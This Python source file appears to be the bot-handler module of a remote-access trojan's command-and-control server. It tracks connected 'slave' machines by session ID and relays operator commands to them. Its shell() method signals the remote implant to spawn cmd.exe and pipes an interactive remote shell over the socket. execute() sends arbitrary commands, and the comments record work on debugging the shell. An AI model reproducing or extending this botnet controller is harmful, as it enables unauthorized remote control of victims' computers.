
# Main imports
import socket
import sys
import os
import signal
import threading
import queue
import time

# Project imports
import server
import interpreter
# from server import batchList, aliveConnections, deadConnections, clientAddressList
# from interpreter import Interpreter

class Handler(threading.Thread):

    def __init__(self, client, client_address, alive, bot_id):
        threading.Thread.__init__(self)
        self.client = client
        self.client_address = client_address
        self.ip = client_address[0]
        self.port = client_address[1]
        self.isAlive = alive
        self.bot_id = bot_id
        self.info = [self.bot_id,self.ip,self.port]

    def run(self):

        # Returns 'Thread-#': Useful for specific interaction?
        # This specific line returns 'None'
        #self.BotName = threading.current_thread().getName()

        print(f"[*BotHandler-Msg] Slave {self.ip}:{str(self.port)} connected with Session ID of {str(self.bot_id)}")

        # [NIX'D] - Interesting, we can use strings (Thread-#) to index an array. Noted...
        server.clientAddressList[self.bot_id] = self.client_address
        # [NIX'D] - This is a useful array in which we can access Client information (IP, Port) by thread-id
    

    # Should I remove these and simply have the user select certain connections upon switching to Batch-Mode?? --- Yes
    # Decision: don't remove, keep functions. But use them in the Batch-mode interaction ---- No...

    # def activate(self):
    #     print(f"\n[*BotHandler-Msg] Activating Bot {str(self.bot_id)}...")
    #     self.isActive = True
    
    # def deactivate(self):
    #     print(f"\n[*BotHandler-Msg] Deactivating {str(self.bot_id)}...")
    #     self.isActive = False

    # def kill(self):     # hah
    #     print(f"\n[*BotHandler-Msg] Killing connection for Bot {str(self.bot_id)}...")
    #     self.execute("exit")

    #     # Record information into deadConnections[]
    #     deadConnections.append(self.info)           # Append the info so the thread can join the main thread
    #     aliveConnections.remove(self)               # Remove the Handler-thread from the Alives array


    #     print(f"\n[*BotHandler-Msg] Killing thread for BotHandler {str(self.bot_id)}...")
    #     # if(threading.current_thread().is_alive()):
    #     #     threading.current_thread().join


    def isAlive(self):
        return self.isAlive
    
    def getInfo(self):
        return self.info

    def printInfo(self):
        print(self.info)

    def getID(self):
        return self.bot_id

    def getIP(self):
        return self.ip

    def getPort(self):
        return self.port

    def shell(self):

        
        # if command is 'shell':
        #   we send the shell keyword, which initiates the cmd.exe, and then redirects all stdin/out to the socket
        #   the shell will still be receiving any information we send it, therefore thats why it closed only the cmd.exe session when we subsequently exited.
        #   We need to figure out a way to capture the shell keyword here, then send it over, while also realizing in the c2
        #   that we are going to be sending and receiving directly to and from the cmd.exe process, effectively needing a function, loop, or just to catch and exit twice[?]
        #     
        #--------
        # Current problem:
        #   Data from cmd.exe shell is hanging. I have to initially receive the welcome-msg twice (once for the Microsoft 
        #   banner and another for the initial shell/cwd output prompt). After that, 

        # Initiate shell 
        try:
            self.client.send(("shell").encode('utf-8'))             # Signals RAT to initiate cmd.exe process and forward fds to socket 
        except Exception as ex:
            print(f"[* BotHandler-Msg:ShellExec] Unable to initiate shell with bot {self.bot_id} at {str(self.ip)}")
            print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
            return False                            # unsuccessful
        else:
            recvVal = self.client.recv(2048)        # Receive reply from RAT
            print(recvVal)
            #recvVal = self.client.recv(2048))      # Second here because only the Microsoft banner was being sent. 
                                                    # Adding this captures the CWD prompt
            #print(recvVal)

        while (True):                                                           # Capture IO sent over socket (cmd.exe)
            try:
                cmd = input()                                            # Dumb capture in
            except Exception as ex:
                print(f"[* BotHandler-Msg:ShellExec] Unable to parse command")  # Error recived? pass
                print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
            else:
                try:
                    if(cmd.casefold() == 'quit' or cmd.casefold() == 'exit'):
                        self.client.send("exit\n".encode('utf-8'))
                        time.sleep(0.3)
                        recvVal = ((self.client.recv(2048)).decode('utf-8'))
                        print(recvVal.strip("\n"))
                        break
                    else:
                        self.client.send((cmd+"\n").encode('utf-8'))                        # Encode input then send
                        # print(f"--data being sent = {cmd}")                               # ping for send stage
                except Exception as ex:
                    print(f"[* BotHandler-Msg:ShellExec] Unable to send command to bot {self.bot_id} at {str(self.ip)}")        #Error Received? pass
                    print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
                else:
                    # print("--reached receive--") 
                    time.sleep(0.3)                                                         # ping for recv stage
                    recvVal = ((self.client.recv(2048)).decode('utf-8'))       # Receive reply from RAT
                    # print("--printing recv--")                                            # ping for non-hanging return
                    print(recvVal.strip("\n"))                                                          # content-received

            # print("==exiting loop iteration==")                                 # ping for iterative finish

        print(f"[* BotHandler-Msg:ShellExec] Exiting interaction with Bot #{self.bot_id} at {str(self.ip)}")
        return True


    def execute(self, command):

        print(f"[* BotHandler-Msg] Received Command: {str(command)} for bot {str(self.bot_id)}")

        # Single instance execution
        try:
            #command += "\n"

            # Send data/command to RAT
            self.client.send(command.encode('utf-8'))
            #print(recvVal)                                          # Display message received
        except Exception as ex:
            # for t in allConnections:
            #     if t.is_alive() == False:
            #         print("\n[!] Died Thread: " + str(t))
            #         t.join()
            print(f"[* BotHandler-Msg] Unable to send connection to bot {self.bot_id} at {str(self.ip)}")
            print(f"[* BotHandler-Msg] Error: {ex}")
            return "== Return Value Error =="
        else:
            recvVal = (self.client.recv(2048)).decode('utf-8')      # Receive reply from RAT
            return recvVal

            # TODO %%
            # print(f"[* BotHandler-Msg] Using beacon verification to test if host is still up...")
            # if(!beacon(bot_id)):
            #   <Kill connection, join the thread, ad to list of dead bots>
    


    # TODO %%
    def download(self, remotepath, localfile):
        print("TBC")

    def upload(self, localfile, remotepath):
        print("TBC")